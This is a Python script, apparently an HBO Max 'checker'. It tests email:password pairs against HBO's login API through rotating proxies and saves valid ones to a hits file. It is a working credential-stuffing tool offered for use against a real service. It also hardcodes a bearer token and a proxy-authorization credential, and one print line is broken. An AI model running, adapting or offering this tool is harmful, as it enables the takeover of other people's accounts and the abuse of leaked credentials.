import bs4
import functools

from requests import Session
from requests.adapters import HTTPAdapter, Retry
from Checker import *
from proxies import *

def HBOMAX_Check(email:str,password:str):
    while True:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)
                
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                
                login_page = s.get('https://play.hbonow.com/page/urn:hbo:page:home')
                login_page_html = bs4.BeautifulSoup(login_page.text, 'html.parser')
                
                #Login
                payload = {
                    "grant_type": "user_name_password",
                    "scope": "browse video_playback device elevated_account_management",
                    "username": email,
                    "password": password
                }
                
                headers = {
                    "Accept": "application/vnd.hbo.v9.full+json",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-us",
                    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aW1lc3RhbXAiOjE2NjczMjA2NDIwMzYsImV4cGlyYXRpb24iOjE2NjczMzUwNDIwMzYsInBheWxvYWQiOnsiaGlzdG9yaWNhbE1ldGFkYXRhIjp7Im9yaWdpbmFsSXNzdWVkVGltZXN0YW1wIjoxNjY3MzIwNjQyMDM2LCJvcmlnaW5hbEdyYW50VHlwZSI6ImNsaWVudF9jcmVkZW50aWFscyIsIm9yaWdpbmFsVmVyc2lvbiI6Mn0sImV4cGlyYXRpb25NZXRhZGF0YSI6eyJhdXRoelRpbWVvdXRNcyI6MTQ0MDAwMDAsImF1dGhuVGltZW91dE1zIjozMTEwNDAwMDAwMCwiYXV0aHpFeHBpcmF0aW9uVXRjIjoxNjY3MzM1MDQyMDM2LCJhdXRobkV4cGlyYXRpb25VdGMiOjE2OTg0MjQ2NDIwMzZ9LCJ0b2tlblByb3BlcnR5RGF0YSI6eyJjbGllbnRJZCI6Ijg4YTRmM2M2LWYxZGUtNDJkNy04ZWY5LWQzYjAwMTM5ZWE2YSIsImRldmljZVNlcmlhbE51bWJlciI6ImM2YmM5NGFlLWFiODctNDEyZS1iNzhlLTI5YjY2ZjBiYmZhYyIsInBlcm1pc3Npb25zIjpbNSw3XSwiY291bnRyeUNvZGUiOiJVUyIsInBsYXRmb3JtVGVuYW50Q29kZSI6Imhib0RpcmVjdCIsInByb2R1Y3RDb2RlIjoiaGJvTm93IiwiZGV2aWNlQ29kZSI6ImRlc2t0b3AiLCJwbGF0Zm9ybVR5cGUiOiJkZXNrdG9wIiwic2VydmljZUNvZGUiOiJIQk8iLCJjbGllbnREZXZpY2VEYXRhIjp7InBheW1lbnRQcm92aWRlckNvZGUiOiJibGFja21hcmtldCJ9fSwiY3VycmVudE1ldGFkYXRhIjp7ImVudmlyb25tZW50IjoicHJvZHVjdGlvbiIsIm1hcmtldCI6InVzIiwidmVyc2lvbiI6Miwibm9uY2UiOiJjY2EwNzAzZC02YjUyLTQ4ODAtYmY2Yi1jOGNhZDZjNmJjMjgiLCJpc3N1ZWRUaW1lc3RhbXAiOjE2NjczMjA2NDIwMzZ9LCJwZXJtaXNzaW9ucyI6WzUsN10sInRva2VuX3R5cGUiOiJhY2Nlc3MiLCJlbnZpcm9ubWVudCI6InByb2R1Y3Rpb24iLCJtYXJrZXQiOiJ1cyIsInZlcnNpb24iOjJ9fQ._IpbNUjGEkCLv7-saRzrEeWtqxP6MI0uhyFnw8Y_-Cc",
                    "Content-Type": "application/json",
                    "DNT": "1",
                    "Host": "comet.api.hbo.com",
                    "Origin": "https://play.hbonow.com",
                    "Proxy-Authorization": "Basic aDhiOXRDYmlpYWRZQXBLTHF6ampFeXhKOjdqcWpxb1QyMkd0VWVzNGpRMzE0R1ZzUg==",
                    "Referer": "https://play.hbonow.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "Sec-GPC": "1",
                    "TE": "trailers",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
                    "X-B3-TraceId": "f59e06da-3115-4057-a9ef-8d34c93b5cef-1b3cf351-0002-487e-94f3-bc22d3995310",
                    "X-Hbo-Client-Version": "Hadron/28.3.5.37 desktop (DESKTOP)",
                    "X-Hbo-Device-Name": "desktop",
                    "X-Hbo-Device-Os-Version": "undefined"
                }
                
                login = s.post('https://comet.api.hbo.com/tokens', json=payload, headers=headers)
                #print(login.text)
                
                if 'isUserLoggedIn":true' in login.text:
                    print('++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
                    print('HBOMAX - HIT: ' + email + ':' + password)
                    print('++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
                    filee = open('HBOMAX-hits.txt', 'a')
                    filee.write(email + ':' + password + '\n')
                    return_proxy(proxy)
                    return
                elif "invalid_credentials" in login.text:
                    print('----------------------------------------------------------------------------------')
                    print('InvalidPassword: ' + email + ':' + password)
                    print('----------------------------------------------------------------------------------')
                    return_proxy(proxy)
                    return
                elif "RecaptchaCheckFailedError" in login.text:
                    print('ERROR - CHECKER HBOMAX DO NOT WORK')
                    return_proxy(proxy)
                    return
                elif "HBO GO is available only in the United States, including the District of Columbia, and the US territory of Puerto Rico. If you reside in one of these areas and are still having difficulties, please contact your TV provider." in login.text:
                    print('GEOBLOCKED: ', + proxy)
                    bad_proxy(proxy)
                    return_proxy(proxy)
                else:
                    print('BANNED: ' + email + ':' + password)
                    print(login.text)
                    bad_proxy(proxy)
                    return_proxy(proxy)
        except Exception as e:
            bad_proxy(proxy)
            return_proxy(proxy)
            #print(e)
            print('BAD PROXY: '+ proxy)